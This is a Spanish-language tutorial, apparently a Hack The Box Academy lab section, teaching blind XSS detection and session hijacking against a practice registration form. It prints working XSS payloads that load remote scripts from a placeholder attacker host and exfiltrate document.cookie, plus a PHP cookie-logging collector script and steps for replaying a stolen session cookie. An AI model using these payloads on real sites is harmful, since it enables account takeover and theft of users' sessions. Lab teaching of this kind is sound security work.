Las aplicaciones web modernas utilizan cookies para mantener la sesión de un usuario a lo largo de diferentes sesiones de navegación. Esto permite al usuario iniciar sesión una sola vez y mantener su sesión activa incluso si visita el mismo sitio web en otro momento o fecha. Sin embargo, si un usuario malicioso obtiene los datos de la cookie del navegador de la víctima, podría acceder a la sesión iniciada de la víctima sin conocer sus credenciales.

Con la capacidad de ejecutar código JavaScript en el navegador de la víctima, podemos recolectar sus cookies y enviarlas a nuestro servidor para secuestrar su sesión iniciada mediante un ataque de `Session Hijacking` (también conocido como `Cookie Stealing`).

---

## Blind XSS Detection

Usualmente comenzamos los ataques XSS tratando de descubrir si existe y dónde está una vulnerabilidad XSS. Sin embargo, en este ejercicio, trataremos una vulnerabilidad de `Blind XSS`. Una vulnerabilidad de Blind XSS ocurre cuando se dispara en una página a la que no tenemos acceso.

Las vulnerabilidades de Blind XSS suelen ocurrir en formularios accesibles solo por ciertos usuarios (por ejemplo, Admins). Algunos ejemplos potenciales incluyen:

- Formularios de Contacto
- Reseñas
- Detalles de Usuarios
- Tickets de Soporte
- Encabezado HTTP User-Agent

Vamos a ejecutar la prueba en la aplicación web en (`/hijacking`) en el servidor al final de esta sección. Vemos una página de Registro de Usuario con múltiples campos, así que intentemos enviar un usuario `test` para ver cómo maneja el formulario los datos:

`http://SERVER_IP:PORT/hijacking/index.php`

![](https://academy.hackthebox.com/storage/modules/103/xss_blind_test_form.jpg)

Como podemos ver, una vez que enviamos el formulario obtenemos el siguiente mensaje:

`http://SERVER_IP:PORT/hijacking/index.php`

![](https://academy.hackthebox.com/storage/modules/103/xss_blind_test_form_output.jpg)

Esto indica que no veremos cómo se manejará nuestra entrada ni cómo se verá en el navegador, ya que aparecerá solo para el Admin en un Panel de Admin al que no tenemos acceso. En casos normales (es decir, no-blind), podemos probar cada campo hasta obtener una caja de `alert`, como hemos estado haciendo a lo largo del módulo. Sin embargo, dado que no tenemos acceso al panel de Admin en este caso, `¿cómo podríamos detectar una vulnerabilidad XSS si no podemos ver cómo se maneja la salida?`

Para hacerlo, podemos usar el mismo truco que usamos en la sección anterior, que es usar un payload de JavaScript que envíe una solicitud HTTP de vuelta a nuestro servidor. Si el código JavaScript se ejecuta, recibiremos una respuesta en nuestra máquina y sabremos que la página es vulnerable.

Sin embargo, esto introduce dos problemas:

1. `¿Cómo podemos saber qué campo específico es vulnerable?` Dado que cualquiera de los campos puede ejecutar nuestro código, no podemos saber cuál de ellos lo hizo.
2. `¿Cómo podemos saber qué payload de XSS usar?` Dado que la página puede ser vulnerable, pero el payload puede no funcionar.

---

## Loading a Remote Script

En HTML, podemos escribir código JavaScript dentro de las etiquetas `<script>`, pero también podemos incluir un script remoto proporcionando su URL, de la siguiente manera:

```html
<script src="http://OUR_IP/script.js"></script>
```

Así que podemos usar esto para ejecutar un archivo JavaScript remoto que se sirve en nuestra VM. Podemos cambiar el nombre del script solicitado de `script.js` al nombre del campo en el que estamos inyectando, de modo que cuando recibamos la solicitud en nuestra VM, podamos identificar el campo de entrada vulnerable que ejecutó el script, de la siguiente manera:

```html
<script src="http://OUR_IP/username"></script>
```

Si recibimos una solicitud para `/username`, entonces sabemos que el campo `username` es vulnerable a XSS, y así sucesivamente. Con eso, podemos empezar a probar varios payloads de XSS que carguen un script remoto y ver cuál de ellos nos envía una solicitud. Los siguientes son algunos ejemplos que podemos usar de [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss):

```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

Como podemos ver, varios payloads comienzan con una inyección como `'>`, lo que puede o no funcionar dependiendo de cómo se maneje nuestra entrada en el backend. Como se mencionó anteriormente en la sección `XSS Discovery`, si tuviéramos acceso al código fuente (es decir, en un DOM XSS), sería posible escribir con precisión el payload requerido para una inyección exitosa. Es por eso que Blind XSS tiene una tasa de éxito más alta con vulnerabilidades de tipo DOM XSS.

Antes de comenzar a enviar payloads, necesitamos iniciar un listener en nuestra VM, usando `netcat` o `php` como se mostró en una sección anterior:

```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
sudo php -S 0.0.0.0:80
PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```

Ahora podemos empezar a probar estos payloads uno por uno usando uno de ellos para todos los campos de entrada y agregando el nombre del campo después de nuestra IP, como se mencionó anteriormente, así:

```html
<script src=http://OUR_IP/fullname></script> # esto va dentro del campo full-name
<script src=http://OUR_IP/username></script> # esto va dentro del campo username
...SNIP...
```

Consejo: Notaremos que el correo electrónico debe coincidir con un formato de correo electrónico, incluso si intentamos manipular los parámetros de la solicitud HTTP, ya que parece ser validado tanto en el front-end como en el back-end. Por lo tanto, el campo de correo electrónico no es vulnerable y podemos omitir probarlo. Del mismo modo, podemos omitir el campo de contraseña, ya que las contraseñas generalmente están hashadas y no suelen mostrarse en texto claro. Esto nos ayuda a reducir el número de campos de entrada potencialmente vulnerables que necesitamos probar.

Una vez que enviemos el formulario, esperamos unos segundos y verificamos nuestro terminal para ver si algo llamó a nuestro servidor. Si nada llama a nuestro servidor, podemos proceder al siguiente payload, y así sucesivamente. Una vez que recibamos una llamada a nuestro servidor, debemos anotar el último payload de XSS que usamos como un payload funcional y anotar el nombre del campo de entrada que llamó a nuestro servidor como el campo de entrada vulnerable.

`Intenta probar varios payloads de XSS remotos con los campos de entrada restantes y ve cuál de ellos envía una solicitud HTTP para encontrar un payload funcional`.

---

## Session Hijacking

Una vez que encontramos un payload de XSS funcional y hemos identificado el campo de entrada vulnerable, podemos proceder a la explotación de XSS y realizar un ataque de Session Hijacking.

Un ataque de session hijacking es muy similar al ataque de phishing que realizamos en la sección anterior. Requiere un payload de JavaScript para enviarnos los datos necesarios y un script PHP alojado en nuestro servidor para capturar y analizar los datos transmitidos.

Hay múltiples payloads de JavaScript que podemos usar para capturar la cookie de sesión y enviárnosla, como se muestra en [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc):

```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

Usar cualquiera de los dos payloads debería funcionar para enviarnos una cookie, pero usaremos el segundo, ya que simplemente agrega una imagen a la página, lo que puede no parecer muy malicioso, mientras que el primero navega a nuestra página de captura de cookies PHP, lo que puede parecer sospechoso.

Podemos escribir cualquiera de estos payloads de JavaScript en `script.js`, que también se alojará en nuestra VM:

```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie
```

Ahora, podemos cambiar la URL en el payload de XSS que encontramos anteriormente para usar `script.js` (`no olvides reemplazar OUR_IP con la IP de tu VM en el script JS y el payload de XSS`):

```html
<script src=http://OUR_IP/script.js></script>
```

Con nuestro servidor PHP en ejecución, ahora podemos usar el código como parte de nuestro payload de XSS, enviarlo en el campo de entrada vulnerable y deberíamos recibir una llamada a nuestro servidor con el valor de la cookie. Sin embargo, si hubiera muchas cookies, puede que no sepamos qué valor de cookie pertenece a qué encabezado de cookie. Así que podemos escribir un script PHP para dividirlas con una nueva línea y escribirlas en un archivo. De esta manera, incluso si múltiples víctimas activan el exploit de XSS, obtendremos todas sus cookies ordenadas en un archivo.

Podemos guardar el siguiente script PHP como

 `index.php` y volver a ejecutar el servidor PHP:

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Ahora, esperamos a que la víctima visite la página vulnerable y vea nuestro payload de XSS. Una vez que lo hagan, recibiremos dos solicitudes en nuestro servidor, una para `script.js`, que a su vez hará otra solicitud con el valor de la cookie:

```bash
10.10.10.10:52798 [200]: /script.js
10.10.10.10:52799 [200]: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2
```

Como se mencionó anteriormente, obtenemos el valor de la cookie directamente en el terminal, como podemos ver. Sin embargo, dado que preparamos un script PHP, también obtenemos el archivo `cookies.txt` con un registro limpio de cookies:

```bash
cat cookies.txt 
Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2
```

Finalmente, podemos usar esta cookie en la página `login.php` para acceder a la cuenta de la víctima. Para hacerlo, una vez que navegamos a `/hijacking/login.php`, podemos hacer clic en `Shift+F9` en Firefox para revelar la barra de `Storage` en las Herramientas de Desarrollador. Luego, podemos hacer clic en el botón `+` en la esquina superior derecha y agregar nuestra cookie, donde el `Name` es la parte antes de `=` y el `Value` es la parte después de `=` de nuestra cookie robada:

`http://SERVER_IP:PORT/hijacking/index.php`

![](https://academy.hackthebox.com/storage/modules/103/xss_blind_set_cookie_2.jpg)

Una vez que configuramos nuestra cookie, podemos actualizar la página y obtendremos acceso como la víctima:

`http://SERVER_IP:PORT/hijacking/login.php`

![](https://academy.hackthebox.com/storage/modules/103/xss_blind_hijacked_session.jpg)